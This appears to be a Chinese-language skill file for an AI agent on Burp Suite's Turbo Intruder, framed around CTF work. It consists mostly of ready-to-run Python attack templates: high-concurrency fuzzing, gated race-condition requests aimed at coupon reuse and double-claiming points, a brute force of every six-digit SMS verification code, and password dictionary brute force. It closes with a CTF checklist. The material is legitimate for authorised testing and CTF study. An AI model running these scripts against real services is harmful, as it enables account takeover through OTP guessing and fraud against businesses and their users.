---
name: turbo-intruder
description: Use when encountering Turbo Intruder 高并发爆破 - HTTP 管道化、Race Condition、短信验证码爆破、并发攻击
---

# Turbo Intruder 高并发爆破

## Info

- **Tags**: burp, turbo-intruder, race-condition, brute-force
- **用途**: 高并发 Fuzz、竞争条件、验证码爆破

---

## 1. 基础结构

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,    # TCP 连接数
        requestsPerConnection=100,   # 单连接复用请求数
        pipeline=True,               # HTTP/1.1 管道化
        engine=Engine.THREADED       # 引擎类型
    )
    for word in wordlist:
        engine.queue(target.req, word)

def handleResponse(req, interesting):
    table.add(req)
```

用 `%s` 占位符标记 Fuzz 位置。

---

## 2. 引擎选择

| 引擎 | 平均 RPS | 适用场景 |
|------|---------|---------|
| `Engine.BURP` | 5,000 | HTTP/1.1 通用 |
| `Engine.HTTP2` | 15,000 | 支持 HTTP/2 的目标 |
| `Engine.THREADED` | 20,000+ | 最大并发，内存占用高 |

---

## 3. 竞争条件（Race Condition）

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    # 创建 20 个请求，标记为同一组
    for i in range(20):
        engine.queue(target.req, gate='race1')
    # 同时发送
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**适用场景**: 优惠券重复使用、商品超买、积分重复领取。

---

## 4. 短信验证码爆破

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=200,
        engine=Engine.THREADED
    )
    for code in range(0, 1000000):
        word = '{:06d}'.format(code)
        engine.queue(target.req, word)

def handleResponse(req, interesting):
    table.add(req)
```

---

## 5. 字典爆破（剪贴板/文件）

```python
# 从剪贴板读取
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    passwords = wordlists.clipboard
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    engine.openGate('1')

# 从文件读取
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=True,
        engine=Engine.BURP
    )
    for word in open('/path/to/dict.txt'):
        engine.queue(target.req, word.rstrip())
```

---

## 6. 响应筛选

```python
def handleResponse(req, interesting):
    # 只看非 404 的响应
    if req.status != 404:
        table.add(req)

    # 筛选特定内容
    if req.status == 200 and "success" in req.response:
        table.add(req)
```

---

## CTF 检查清单

- [ ] 验证码接口 → 并发爆破（THREADED 引擎）
- [ ] 支付/优惠券 → Race Condition（openGate 同时发送）
- [ ] 签到/积分 → 并发重复请求
- [ ] 大字典爆破 → pipeline=True 加速
- [ ] 支持 HTTP/2 → Engine.HTTP2
